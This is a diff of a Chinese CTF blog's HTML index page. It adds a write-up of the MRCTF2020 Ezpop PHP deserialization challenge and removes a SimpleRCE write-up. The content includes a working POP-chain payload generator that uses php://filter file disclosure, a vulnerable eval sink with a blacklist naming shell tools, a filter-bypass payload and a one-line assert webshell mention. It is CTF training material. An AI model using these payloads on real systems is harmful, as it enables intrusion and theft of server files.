@@ -2246,6 +2246,147 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-10-26 00:00:00+00:00">2026-10-26</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="mrctf2020-ezpop"><a class="toclink" href="../../mrctf2020-ezpop/">[MRCTF2020] Ezpop</a></h2>
+<p><img alt="源码 1/2" src="../../../assets/images/mrctf2020-ezpop/01-source-a.png" /></p>
+<p><img alt="源码 2/2" src="../../../assets/images/mrctf2020-ezpop/02-source-b.png" /></p>
+<h3 id="_1"><a class="toclink" href="../../mrctf2020-ezpop/#_1">先审计代码</a></h3>
+<p>发现是 PHP 序列化串（先附上相关知识点）：</p>
+<p><img alt="魔术方法表" src="../../../assets/images/mrctf2020-ezpop/03-magic.png" /></p>
+<h3 id="_2"><a class="toclink" href="../../mrctf2020-ezpop/#_2">从终点往回找</a></h3>
+<p>先找可以执行的地方。</p>
+<p>在 <code>Modifier</code> 类的 <code>append</code> 下有 <code>include</code> 可以利用，而调用 <code>include</code> 需要先有 <code>__invoke</code> 的调用。</p>
+<p>触发 <code>__invoke</code> 的方式是<strong>有对象被当成函数来调用</strong>，所以去找哪里是可以把对象当成函数来调用的 —— 观察到在 <code>Test</code> 类的 <code>__get()</code> 里会调用 <code>$function()</code>，也就达成了 <code>__invoke</code> 的触发要求。</p>
+<p>再看 <code>__get</code> 的触发条件：<strong>当访问不存在的属性时会被调用</strong>。也就是说，访问 <code>Test</code> 类中不存在的属性时会被调用。</p>
+<p>所以这里再去看最后一个类，发现 <code>__toString</code> 中会去访问 <code>$this-&gt;str-&gt;source</code> —— 这里我们只要让 <code>str</code> 为 <code>Test</code> 类，那它去访问 <code>str-&gt;source</code> 时就会触发 <code>__get</code>。</p>
+<p>接着要考虑 <code>__toString</code> 的触发条件：<strong>当把一个对象当成字符串来执行时会触发</strong>。</p>
+<p>那很明显就是 <code>preg_match</code>：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x">preg_match('/正则表达式/', $字符串, $匹配结果数组);</span>
+</span></code></pre></div>
+<p>这里他把 <code>$this-&gt;source</code> 放进了 <code>preg_match</code> 的第二个参数，所以我们只要让他作为一个类 —— 又因为要同时包含 <code>str</code>，所以只能是 <code>Show</code> 类。</p>
+<p>最后是如何触发 <code>__wakeup</code>：它的触发条件是<strong>当使用 <code>unserialize</code> 时触发</strong>，那么就完成了闭环。</p>
+<h4 id="_3"><a class="toclink" href="../../mrctf2020-ezpop/#_3">逆推方向（找链的顺序）</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>include ← __invoke ← __get ← __toString ← __wakeup ← unserialize($_GET['pop'])
+</span></code></pre></div>
+<p><strong>这是从终点往入口找的顺序。</strong></p>
+<h4 id="_4"><a class="toclink" href="../../mrctf2020-ezpop/#_4">正向执行顺序（实际跑起来的样子）</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>unserialize($_GET['pop'])
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>    → Show::__wakeup()          preg_match(..., $this-&gt;source) 把对象当字符串
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>    → Show::__toString()        $this-&gt;str-&gt;source 读不存在的属性
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    → Test::__get('source')     $function = $this-&gt;p; $function()
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>    → Modifier::__invoke()      $this-&gt;append($this-&gt;var)
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    → Modifier::append()        include($value)
+</span></code></pre></div>
+<p><strong>这条 POP 链就走完了。</strong></p>
+<h3 id="_5"><a class="toclink" href="../../mrctf2020-ezpop/#_5">构造序列化</a></h3>
+<p><img alt="生成 payload" src="../../../assets/images/mrctf2020-ezpop/04-payload.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="x">class Modifier {</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="x">    protected $var = "php://filter/convert.base64-encode/resource=flag.php";</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="x">}</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="x">class Test { public $p; }</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="x">class Show { public $source; public $str; }</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="x">$pop = new Show;</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="x">$pop-&gt;source = new Show;        // 外层 source → 内层 Show（触发 __toString）</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="x">$pop-&gt;source-&gt;str = new Test;   // 内层的 str → Test（触发 __get）</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="x">$pop-&gt;source-&gt;str-&gt;p = new Modifier;   // Test 的 p → Modifier（触发 __invoke）</span>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="x">echo serialize($pop);</span>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="x">echo ("&lt;br&gt;");</span>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="x">echo urlencode(serialize($pop));</span>
+</span></code></pre></div>
+<p><strong>四层的分工：</strong></p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>属性</th>
+<th>给谁用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>外层 <code>Show</code></td>
+<td><code>source</code></td>
+<td><code>__wakeup</code> 的 <code>preg_match</code></td>
+</tr>
+<tr>
+<td>内层 <code>Show</code></td>
+<td><code>str</code></td>
+<td><code>__toString</code> 的 <code>$this-&gt;str</code></td>
+</tr>
+<tr>
+<td><code>Test</code></td>
+<td><code>p</code></td>
+<td><code>__get</code> 的 <code>$function</code></td>
+</tr>
+<tr>
+<td><code>Modifier</code></td>
+<td><code>var</code></td>
+<td><code>append</code> 的 <code>include</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="_6"><a class="toclink" href="../../mrctf2020-ezpop/#_6">为什么要用伪协议</a></h3>
+<p><strong>这里因为直接 include 会把 PHP 代码执行掉（而 <code>flag.php</code> 里没有 echo，执行完什么都不输出），
+所以我们利用伪协议先把它编码成 base64 —— 编码后的文本不含 <code>&lt;?php</code>，<code>include</code> 就会</strong>原样输出<strong>而不是执行。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>php://filter/convert.base64-encode/resource=flag.php
+</span></code></pre></div>
+<h3 id="0"><a class="toclink" href="../../mrctf2020-ezpop/#0"><code>\0</code> 的坑</a></h3>
+<p><strong>注意：因为 <code>var</code> 的属性是 <code>protected</code>，序列化时会生成 <code>\0*\0var</code>（长度 6，两个空字节也算）。</strong></p>
+<p><strong>但是如果你直接把它复制到 URL 上，这两个空字节会被吞掉，<code>s:6:"*var"</code> 长度就对不上了。</strong></p>
+<p><strong>所以生成时最好就直接 <code>urlencode()</code>，避免出错：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="x">echo urlencode(serialize($pop));</span>
+</span></code></pre></div>
+<p><strong>编码后这一小段是 <code>s:6:%22%00*%00var%22</code>。</strong></p>
+<h3 id="flag"><a class="toclink" href="../../mrctf2020-ezpop/#flag">拿 flag</a></h3>
+<p><strong>最后得到 base64 编码的 flag，解码就好了。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>?pop=&lt;urlencode 后的整条串&gt;
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>→ 页面吐出 base64
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>→ 解码 → flag.php 源码 → flag
+</span></code></pre></div>
+<h3 id="_7"><a class="toclink" href="../../mrctf2020-ezpop/#_7">这题的收获</a></h3>
+<p><strong>第一次做 POP 链，最有用的一条是：</strong></p>
+<blockquote>
+<p><strong>不能从头读代码，要从</strong>能干活的那个函数<strong>（sink）往回找。</strong></p>
+</blockquote>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>① 找 sink      include / eval / system / call_user_func
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>② 谁能碰到它    哪个魔术方法里调用了它
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>③ 那个魔术方法怎么触发   对象当字符串？当函数？读不存在的属性？
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>④ 一路往回，直到 unserialize
+</span></code></pre></div>
+<p><strong>中间那条 <code>__get</code> 最容易绕晕：它不是"属性值为空"，而是"这个类里根本没有这个属性"。</strong>
+<strong><code>Test</code> 只有 <code>$p</code>，所以读 <code>-&gt;source</code> 必然触发 —— 你什么都不用设。</strong></p>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-10-25 00:00:00+00:00">2026-10-25</time></li>
         
           <li class="md-meta__item">
@@ -3433,145 +3574,6 @@ Firefox：存储 → Cookie</p>
 <p><strong>有 <code>eval</code> 就够 —— <code>assert($_POST["cmd"])</code> 就是完整的一句话。</strong></p>
 <p><strong>有命令执行 ≠ 能读 flag —— <code>/flag</code> 常常是 0400 root，得靠 SUID 的 <code>/readflag</code>。</strong></p>
 <p><strong>终端里"没反应"先看 stderr 和退出码，别急着换工具。</strong></p>
-</blockquote>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-21 00:00:00+00:00">2026-10-21</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../category/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-meta__link">代码执行</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 1 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="dest0g3-520-simplerce-hacker"><a class="toclink" href="../../dest0g3-simplerce/">[Dest0g3 520迎新赛] SimpleRCE —— 关键词被替换成 hacker 之后</a></h2>
-<h3 id="_1"><a class="toclink" href="../../dest0g3-simplerce/#_1">源码</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">$aaa = $_POST['aaa'];</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="x">$black_list = array('^','.','`','&gt;','&lt;','=','"','preg','&amp;','|','%0','popen',</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="x">'char','decode','html','md5','{','}','post','get','file','ascii','eval',</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="x">'replace','assert','exec','$','include','var','pastre','print','tail','sed',</span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="x">'pcre','flag','scan','decode','system','func','diff','ini_','passthru',</span>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="x">'pcntl','proc_open','+','cat','tac','more','sort','log','current','\\',</span>
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="x">'cut','bash','nl','wget','vi','grep');</span>
-</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="x">$aaa = str_ireplace($black_list, "hacker", $aaa);</span>
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="x">eval($aaa);</span>
-</span></code></pre></div>
-<h3 id="_2"><a class="toclink" href="../../dest0g3-simplerce/#_2">两个关键判断</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>① eval()          → 执行的是 PHP 代码,不是 shell 命令
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>② str_ireplace()  → 命中就【替换成 hacker】,不是拦截
-</span></code></pre></div>
-<p><strong>所以 <code>;ls /</code> 死路一条 —— <code>ls /</code> 不是合法 PHP。</strong></p>
-<h3 id="_3"><a class="toclink" href="../../dest0g3-simplerce/#_3">被封的东西</a></h3>
-<table>
-<thead>
-<tr>
-<th>被封</th>
-<th>后果</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>$</code></td>
-<td>不能用变量</td>
-</tr>
-<tr>
-<td><code>.</code></td>
-<td>不能字符串拼接</td>
-</tr>
-<tr>
-<td><code>flag</code></td>
-<td>变成 <code>hacker</code></td>
-</tr>
-<tr>
-<td><code>system</code> / <code>eval</code> / <code>assert</code> / <code>include</code></td>
-<td>常用执行函数全灭</td>
-</tr>
-<tr>
-<td><code>file</code> <code>scan</code> <code>glob</code>…</td>
-<td>部分读文件函数被连坐</td>
-</tr>
-</tbody>
-</table>
-<h3 id="_4"><a class="toclink" href="../../dest0g3-simplerce/#_4">过程</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>① echo(12);                → 页面出 12,确认 eval 通
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>② echo(join(glob('/*')));  → 列出根目录,发现 flag
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>③ 但 flag 会被替换,不能写 '/flag'
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>④ 用位置:array_slice(glob('/*'),4,1) → ['/flag']
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>⑤ join 成字符串 → show_source 读出来
-</span></code></pre></div>
-<p><strong>最终 payload：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x">show_source(join(array_slice(glob('/*'),4,1)));</span>
-</span></code></pre></div>
-<h3 id="_5"><a class="toclink" href="../../dest0g3-simplerce/#_5">每一步在绕什么</a></h3>
-<table>
-<thead>
-<tr>
-<th>步骤</th>
-<th>绕的是</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>glob('/*')</code></td>
-<td>不知道文件名</td>
-</tr>
-<tr>
-<td><code>array_slice(...,4,1)</code></td>
-<td><code>flag</code> 这个词不能出现</td>
-</tr>
-<tr>
-<td><code>join(...)</code></td>
-<td><code>.</code> 被禁，不能拼接</td>
-</tr>
-<tr>
-<td><code>show_source(...)</code></td>
-<td><code>file_get_contents</code> 含 <code>file</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="_6"><a class="toclink" href="../../dest0g3-simplerce/#_6">踩的坑</a></h3>
-<div class="admonition bug">
-<p class="admonition-title">echo(12) 没反应</p>
-<p><strong>eval 里语句必须带 <code>;</code>。</strong>
-普通 PHP 文件里 <code>?&gt;</code> 能代替分号，eval 没有 <code>?&gt;</code>。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Parse error: syntax error, unexpected end of file, expecting ';'
-</span></code></pre></div>
-</div>
-<div class="admonition bug">
-<p class="admonition-title">echo(glob('/*')) 只输出 Array</p>
-<p>echo 不能输出数组，要先 <code>join()</code>。</p>
-</div>
-<div class="admonition bug">
-<p class="admonition-title">show_source('/f*') 失败</p>
-<p>show_source 不做通配符展开 —— 它去找一个名字字面量叫 <code>f*</code> 的文件。</p>
-</div>
-<h3 id="_7"><a class="toclink" href="../../dest0g3-simplerce/#_7">收获</a></h3>
-<blockquote>
-<p><strong>关键词被替换 ≠ 无解 —— 用「运行时拼接」把词造出来。</strong></p>
-<p><strong>名字被过滤 ≠ 无解 —— 用「位置」代替「名字」。</strong></p>
-<p><strong>先分清 eval 还是 system，否则整个方向都是错的。</strong></p>
 </blockquote>
     
     
